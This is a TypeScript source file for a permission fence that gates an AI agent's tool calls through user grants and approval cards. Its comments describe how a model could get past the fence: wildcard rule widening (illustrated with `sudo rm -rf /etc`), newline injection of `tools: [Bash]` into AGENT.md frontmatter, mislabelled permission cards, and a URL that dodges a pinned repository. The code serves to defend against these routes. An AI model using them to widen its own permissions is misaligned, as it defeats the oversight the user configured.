  if (isPrMerge(toolName, input) && !rule.startsWith(toolName === 'Bash' ? 'Bash(gh pr merge ' : `${PR_MERGE_TOOL_NAME}(`)) {
    return false;
  }

  /*
    The auto-merge rule is read as gh reads the merge, never as a glob: the glob let a URL selector pick
    its own repository past the pinned `--repo` (`gh pr merge https://github.com/x/y/pull/5 --repo ok/z`).
    One plain merge into the consenting repository, nothing else on the line; `decide` covers a merge
    chained beside other commands (`autoMergeCovers`).
  */
  const autoMerge = toolName === 'Bash' ? AUTO_MERGE_RULE.exec(rule) : null;
  if (autoMerge !== null) {
    const command = str(input, 'command') ?? '';
    const segments = shellSegments(command);
    return (
      segments?.length === 1 &&
      !REDIRECT.test(command) &&
      !hidesMerge(command, segments) &&
      plainMergeRepo(segments[0]!) === autoMerge[1]
    );
  }

  // No rule but the literal may allow one: see DEFAULT_BRANCH_PUSH.
  if (isDefaultBranchPush(toolName, input)) return false;

  if (rule === '*') return true;

  const open = rule.indexOf('(');

  if (open === -1) {
    // A bare name: an exact tool, or an mcp glob in the tool segment only.
    if (!rule.includes('*')) return rule === toolName;
    if (!rule.startsWith('mcp__')) return false;
    return globToRegExp(rule).test(toolName);
  }

  if (!rule.endsWith(')')) return false;

  const head = rule.slice(0, open);
  const pattern = rule.slice(open + 1, -1);
  if (head !== toolName || pattern === '') return false;

  const text = specifierTextFor(toolName, input);
  if (text === undefined) return false;

  // Both guards test the *candidate* — what the model is actually asking to
  // run or read — not the rule, because a rule the user typed by hand is
  // allowed to be as wide as they meant it to be. It is the call that must
  // not sneak past the rule's own caption.
  if (toolName === 'Bash' && SHELL_CONTROL.test(controlText(rule, text))) return false;
  if (PATH_TOOLS[toolName] !== undefined && walksUp(text)) return false;

  return globToRegExp(pattern).test(text);
}

/**
 * The permission fence's one decision (HIVE-339). Every CLI's fence ends here — MCP `approve`
 * for Claude, the receiver for a hook-based CLI — so no adapter runs a second matcher. Pure:
 * posting the ask on `ask` is the caller's, and so is failing closed when it cannot.
 */
export function decide(
  tool: string,
  input: Record<string, unknown>,
  grants: readonly string[],
): FenceVerdict {
  if (grants.some((rule) => matches(rule, tool, input))) return { behavior: 'allow' };
  if (tool === 'Bash' && autoMergeCovers(str(input, 'command') ?? '', grants)) return { behavior: 'allow' };

  /*
    Never ask what cannot be described. `Ledger.append` downgrades a permission ask whose `tool`
    is not a tool name to an ordinary one with an empty body: a card that says nothing.

    **Below the grants check, not above it.** A grant is a decision the user already made, and
    `matches` compares the name literally, so a rule can name a tool this predicate rejects.
    Above the check this denied calls the fence was configured to allow — MCP tool names carry
    hyphens, which `isToolName` did not always admit. Only the road that renders a card needs a
    describable name.

    `PERMISSION_DENY_MESSAGE` rather than a bespoke line: that text tells the model to end its
    turn instead of retrying.
  */
  if (!isToolName(tool)) return { behavior: 'deny', message: PERMISSION_DENY_MESSAGE };

  return { behavior: 'ask' };
}

/**
 * Whether a piece of text derived from the call is safe to compose into a
 * generated rule.
 *
 * Two characters are load-bearing in the `tools:` DSL: `,` separates rules
 * with no escaping, and `*` is the wildcard `matches` expands. `matches`
 * must keep reading `*` as a deliberate wildcard in a rule a *user* typed by
 * hand — that is not this guard's business. But the text here (a Bash
 * command's head, a fetched URL's host, a file path's directory) comes from
 * the model's own tool call, and this module is the one composing it into a
 * rule string. `Bash(*rm *)` does not read as "the *rm command" once
 * composed — `globToRegExp` turns it into `/^.*rm .*$/`, which also grants
 * `sudo rm -rf /etc`. A model that wants a wide-open grant only has to put a
 * `*` in the command it asks to run. Refusing to compose is the safe
 * failure, same as the comma case: the rung is dropped and the ladder
 * degrades to `once` / `all <Tool>`.
 *
 * ## Why this is an allowlist and not a longer denylist
 *
 * A denylist of `,` and `*` covered the characters the *rule grammar* reads
 * and none of the characters the *file format* reads, and the composed rule
 * is written into `AGENT.md`. That was a live frontmatter injection needing
 * no forged ask at all — the CLI hands `approve` the model's raw `input` and
 * it is copied into `meta` verbatim, so the model picks this text:
 *
 * ```
 * rungsFor('Read', { file_path: '/x\ntools: [Bash]\n/y.txt' })
 *   → rule: 'Read(/x\ntools: [Bash]\n/**)'
 * ```
 *
 * Written into `tools:`, that lands a second `tools:` line in the file.
 * `readFrontmatter` builds a `Map` and the later key wins, so `parseAgent`
 * reads `tools: [Bash]` with no problems reported: the agent permanently
 * holds `Bash`, and the `Read` the user actually granted is silently gone.
 * `]` alone closes the list early; `#` starts a comment; `(` and `)` break
 * out of the `Tool(…)` specifier itself.
 *
 * Enumerating those is how the first version of this guard was wrong. The
 * allowlist instead names what a Bash head, a hostname and a directory path
 * are actually made of, so a character nobody thought about fails closed —
 * the rung is dropped, the ladder degrades, and nothing is written. A real
 * path that falls outside it loses its family rung and keeps `once` and
 * `all <Tool>`, which is the documented safe failure.
 */
const COMPOSABLE = /^[A-Za-z0-9 _\-./:+@~]+$/;

const isSafeToCompose = (text: string): boolean => COMPOSABLE.test(text);

/**
 * The longest a rung label may be before the ladder stops fitting.
 *
 * The scope ladder is a segmented control in a 316px rail and its three
 * labels share one row — `once`, the family rule, and `all <Tool>`. A real
 * `file_path` is an absolute one, so the family label was routinely 37
 * characters (`/Users/someone/.hive/work/prpd/**`) and ate the whole row:
 * `all Edit` wrapped onto two lines and the group overflowed the rail, which
 * is what was reported.
 *
 * 22 is what measurement leaves once the other two segments and their padding
 * are taken out of the rail's ~290px of card content at 12.5px.
 */
const LABEL_MAX = 22;

/**
 * `/Users/y/.hive/work/prpd/**` → `…/prpd/**`, and a short one untouched.
 *
 * The label is the only part of a rung that is *display*, and it is the one
 * part that has to fit — the `rule` it grants and the `caption` under it both
 * keep the directory whole, so nothing the user consents to is hidden by this.
 * The tail is what is kept because the tail is what distinguishes one
 * directory from another; leaving it to a CSS truncation would keep the head
 * instead and leave every rung reading `/Users/yunid.b…`.
 *
 * Two cuts, in order, because one is not enough. Dropping the parents fixes
 * the reported case, but `.hive/work/worktree-fix-rung-labels` is an ordinary
 * directory in this very app and `…/worktree-fix-rung-labels/**` is still 29
 * characters — so a last segment that overruns the budget on its own is cut
 * too. The bound has to hold in the *data*: the control can only truncate by
 * taking width from a segment, and there is no width here to take that does
 * not come out of `once` and `all <Tool>`.
 *
 * A directory with no parent never gains a `…/` prefix — that would claim a
 * parent it does not have — but it is still cut to the budget.
 */
const elideDirLabel = (dir: string): string => {
  if (`${dir}/**`.length <= LABEL_MAX) return `${dir}/**`;

  const slash = dir.lastIndexOf('/');
  const tail = slash === -1 ? dir : `…/${dir.slice(slash + 1)}`;

  return `${tail}/**`.length <= LABEL_MAX
    ? `${tail}/**`
    : `${tail.slice(0, LABEL_MAX - '…/**'.length)}…/**`;
};

/** The family rule for a call, or `undefined` when the tool has no specifier. */
const familyRuleFor = (
  toolName: string,
  input: Record<string, unknown>,
): { rule: string; label: string; caption: string } | undefined => {
  if (toolName === 'Bash') {
    const command = str(input, 'command');
    const head = command?.trim().split(/\s+/)[0];
    if (head === undefined || head === '' || !isSafeToCompose(head)) return undefined;
    return {
      rule: `Bash(${head} *)`,
      label: `${head} *`,
      caption: `never asks again for ${head} commands.`,
    };
  }

  if (toolName === 'WebFetch') {
    const url = str(input, 'url');
    const host = url === undefined ? undefined : hostOf(url);
    if (host === undefined || !isSafeToCompose(host)) return undefined;
    return {
      rule: `WebFetch(domain:${host})`,
      label: host,
      caption: `never asks again for ${host}.`,
    };
  }

  const key = PATH_TOOLS[toolName];
  if (key === undefined) return undefined;
  const path = str(input, key);
  if (path === undefined) return undefined;
  const slash = path.lastIndexOf('/');
  // No `/` at all (a bare filename) means no directory to name — guard on
  // the index itself, not the sliced result: slice(0, -1) on a `-1` index
  // silently drops the path's last character instead of yielding "no dir".
  if (slash <= 0) return undefined;
  const dir = path.slice(0, slash);
  if (!isSafeToCompose(dir)) return undefined;
  return {
    rule: `${toolName}(${dir}/**)`,
    label: elideDirLabel(dir),
    caption: `never asks again under ${dir}.`,
  };
};

export function rungsFor(
  toolName: string,
  input: Record<string, unknown>,
): Rung[] {
  const rungs: Rung[] = [
    {
      id: 'allow-once',
      label: 'once',
      caption: 'runs this once. asks again next time.',
    },
  ];

  if (isPrMerge(toolName, input)) {
    /*
      HIVE-409: the card teaches the project switch. No rule: allow-project writes nothing to AGENT.md.
      `target.repo` is model-written text shown in a caption; `--repo`'s `\S+` keeps it to one line,
      and `permissions.ts` resolves it to a configured project before anything is switched.
    */
    const target = mergeTarget({ tool: toolName, input });
    if (target !== undefined) {
      rungs.push({
        id: ALLOW_PROJECT,
        label: 'merge unattended for this project',
        caption: `turns on auto-merge for ${target.repo} and merges this one.`,
      });
    }
    return rungs;
  }
  // No standing rung grants a once-only tool or a default-branch push (`matches`), so the card offers none.
  if (ONCE_ONLY_TOOLS.has(toolName) || isDefaultBranchPush(toolName, input)) return rungs;

  /*
    Both rules below embed `toolName`, so both are gated on `isToolName`
    rather than the weaker `isSafeToCompose` this used to use.

    `isSafeToCompose` bans `,` and `*` — the two characters the glob DSL
    reads — but says nothing about the characters the *file format* reads.
    `toolName` is echoed back as the `allow-tool` rule verbatim and written
    into `tools:` unescaped, so `Bash]\ntools: [Write` closed the list early
    and gave `AGENT.md` a second `tools:` key. Callers already reject that
    (`permissions.ts`), but the echo happens here, so the guard belongs here
    too: a rule this function emits is provably a tool name.
  */
  const family = isToolName(toolName) ? familyRuleFor(toolName, input) : undefined;
  if (family !== undefined) {
    rungs.push({ id: 'allow-family', ...family });
  }

  if (isToolName(toolName)) {
    rungs.push({
      id: 'allow-tool',
      label: `all ${toolName}`,
      caption: `never asks again for ${toolName}.`,
      rule: toolName,
    });
  }

  return rungs;
}

/** Tools the grammar can name a *part* of. Everything else is all-or-nothing. */
const hasSpecifier = (toolName: string): boolean =>
  toolName === 'Bash' ||
  toolName === 'WebFetch' ||
  PATH_TOOLS[toolName] !== undefined ||
  FENCE_ONLY_TOOLS.has(toolName);

/**
 * The rule that grants **this one call and nothing else** (HIVE-119).
 *
 * `allow-once` used to be handed out as the bare tool name, and a bare name
 * matches every call to that tool: clicking `once` on `touch /tmp/x`
 * authorised every `Bash` command for the rest of the wake, up to
 * `limits.turns`, while the caption read "runs this once. asks again next
 * time." So the grant is the call itself, as a {@link LITERAL_PREFIX} rule —
 * no glob, no escaping, no text the model can shape into a wider pattern.
 *
 * There is **no fallback**. The one case that returns `undefined` is a tool
 * the grammar can specify (`Bash`, `WebFetch`, a path tool) whose call
 * carries no specifier — `meta.input` omitted, say, which is precisely how
 * the untrusted side used to choose when the fallback fired. The caller
 * refuses out loud instead of quietly granting something wider.
 *
 * A tool with no specifier at all (`Grep`, an MCP tool) returns its bare
 * name, and that is not a widening: the bare name is the finest grain the
 * fence has for it, so "once" and "all Grep" authorise the same calls — they
 * differ only in how long the grant lives, which is exactly what the two
 * rungs say.
 */
export function oneShotRuleFor(
  toolName: string,
  input: Record<string, unknown>,
): string | undefined {
  if (!isToolName(toolName)) return undefined;
  const text = specifierTextFor(toolName, input);
  if (text === undefined) return hasSpecifier(toolName) ? undefined : toolName;
  return `${LITERAL_PREFIX}${toolName}:${text}`;
}

export function defaultRungFor(rungs: readonly Rung[]): RungId {
  if (rungs.some((rung) => rung.id === 'allow-family')) return 'allow-family';
  if (rungs.some((rung) => rung.id === 'allow-tool')) return 'allow-tool';
  return 'allow-once';
}

export function summarise(
  toolName: string,
  input: Record<string, unknown>,
): string {
  const text = specifierTextFor(toolName, input);
  return text === undefined ? `use ${toolName}` : text;
}

/**
 * Fields whose value is bulk content rather than a specifier, replaced by a
 * marker before anything is stored (HIVE-125, moved from `mcp-host/tools.ts`).
 *
 * The ledger is append-only JSONL that never rotates and `store.all()` holds
 * every entry in memory, so a denied `Write` used to park up to 64 KiB in the
 * log permanently. It lives here rather than at the tool because a direct
 * `ledger_ask` reaches the log without passing the tool at all.
 */
const BULK_FIELDS = ['content', 'new_string', 'old_string'];

/** The longest `meta.run` a card will carry — a run id is a uuid (36). */
const RUN_MAX_LENGTH = 64;

const asRecord = (value: unknown): Record<string, unknown> =>
  typeof value === 'object' && value !== null && !Array.isArray(value)
    ? (value as Record<string, unknown>)
    : {};

const without = (
  meta: Record<string, unknown>,
  keys: readonly string[],
): Record<string, unknown> =>
  Object.fromEntries(Object.entries(meta).filter(([key]) => !keys.includes(key)));

const keepForTheLedger = (input: Record<string, unknown>): Record<string, unknown> => {
  const trimmed: Record<string, unknown> = { ...input };

  for (const field of BULK_FIELDS) {
    if (!(field in trimmed)) continue;

    /*
      Bounded whatever its type. The string case is the one that occurs, but
      the marker used to be conditional on it, so `content: ['x'.repeat(64000)]`
      walked past the only trim point in the system and parked in the log
      anyway. A non-string in these fields is malformed input, and reporting
      its size in characters would be a lie, so it is named rather than
      measured.
    */
    const value = trimmed[field];
    trimmed[field] =
      typeof value === 'string'
        ? `[omitted from the ledger: ${value.length} chars]`
        : '[omitted from the ledger]';
  }

  return trimmed;
};

/**
 * What a permission ask is allowed to say (HIVE-125).
 *
 * HIVE-119 bounded the **grant**: it is computed in main from `meta.tool` and
 * `meta.input`, both validated as a tool name, and never from free text. It
 * did not bound the **card**, whose title and body came from `ask.body` and
 * whose scope labels came from `meta.rungs` — all model-written, and none of
 * it tied to the meta the grant is computed from. An ask could therefore read
 * `Allow Read? /repo/a.ts` while carrying `meta.tool: "Bash"`, and the click
 * that looked like reading a file authorised a shell command.
 *
 * `meta` is a free-form rider that `ledger_ask` passes through unfiltered, so
 * this cannot be fixed at the tool: an agent posting the ask directly bypasses
 * `hive_approve` entirely, which is precisely the attack. It is fixed at
 * `Ledger.append` instead — the one door every writer passes through — so the
 * deceptive text never enters the log and every downstream consumer (the card,
 * the OS toast, `deliver.ts`, the renderer's mirror) is honest for free.
 *
 * Four inputs are model-controlled and all four are replaced or dropped:
 * `body`, `meta.rungs`, `meta.default` (which rung opens *preselected*) and
 * `meta.quote` — which, when this was written, retitled the card and hid the
 * command block. The card no longer lets it do either, and the key is still
 * dropped: a draft reply above a command to authorise is the fenced party
 * writing the frame around its own request. `meta.inbound` is the same
 * argument and is excluded by the same allowlist, without being named in it.
 *
 * An ordinary ask is returned untouched: its body is the asker's message and
 * is meant to be read as written.
 */
export function honestPermissionAsk(
  body: string,
  meta: Record<string, unknown>,
): { body: string; meta: Record<string, unknown> } {
  if (meta['kind'] !== 'permission') return { body, meta };

  const tool = meta['tool'];

  /*
    Not a tool name, so main cannot describe the call and must not offer a
    ladder for it. Downgraded to an ordinary ask rather than refused: the
    asker's own words are honest as long as nothing frames them as a
    permission prompt, so the question still reaches the user and nothing
    lies. Refusing would make a malformed ask vanish instead.
  */
  if (!isToolName(tool)) {
    return { body, meta: without(meta, ['kind', 'rungs', 'default']) };
  }

  /*
    Trimmed first, then everything else derived from the *same* object that is
    stored. `permissions.ts` recomputes `rungsFor(tool, meta.input)` off the
    stored entry when it writes the grant, so deriving display from a different
    input would make display/grant equality a coincidence rather than a
    construction — bulk fields happen not to be specifiers today.
  */
  const input = keepForTheLedger(asRecord(meta['input']));
  const rungs = rungsFor(tool, input);

  /*
    The one key on the allowlist that did not start there, and it is not an
    exception to the rule below — it is that rule applied (HIVE-128).

    For an **agent run** the stamp is host-written: `createReceiverClient`
    stamps `HIVE_RUN_ID` onto every post it makes, **over** whatever the model
    wrote, so by the time such an ask reaches this function the value is the
    host's. Dropping it is what a permission ask silently did until the live
    conformance suite caught it — `openAsksFor` matches an open ask to the run
    that wrote it by this stamp and nothing else, so a fenced run closed `done`
    instead of `asking`: the card was on screen, the agent read as idle, and
    the next scheduled tick was free to wake it on top of its own unanswered
    question.

    A **pty session** has no `HIVE_RUN_ID`, so nothing overwrites the field
    there and whatever the model wrote is what arrives. It is therefore bounded
    like everything else the card keeps: kept only when it is a string, so a
    caller that puts an object there smuggles nothing in, and only when it is
    short enough to be a run id — a uuid is 36 characters and 64 is generous.
  */
  const run = meta['run'];
  const honestRun = typeof run === 'string' && run.length <= RUN_MAX_LENGTH;

  /*
    Built from nothing, not from the caller's `meta` with the known keys
    overwritten.

    A denylist only ever excludes the keys someone thought of: spreading the
    original through and blanking `quote` would carry every *other*
    model-supplied key onto an entry the system then certifies as honest, and
    `meta.delivered` — which `deliver.ts` reads off any entry of any kind — is
    one that already exists to be carried. Dropping `quote` was the fix for
    one such key; an allowlist is the fix for the shape of the bug, and makes
    the next `quote` a non-event.

    This is the argument {@link isSafeToCompose} makes for the rule grammar,
    applied to the rider that travels beside it.
  */
  return {
    body: `Allow ${tool}?\n${summarise(tool, input)}`,
    meta: {
      kind: 'permission',
      tool,
      input,
      rungs,
      default: defaultRungFor(rungs),
      options: [...rungs.map((rung) => rung.id), 'deny'],
      ...(honestRun ? { run } : {}),
    },
  };
}
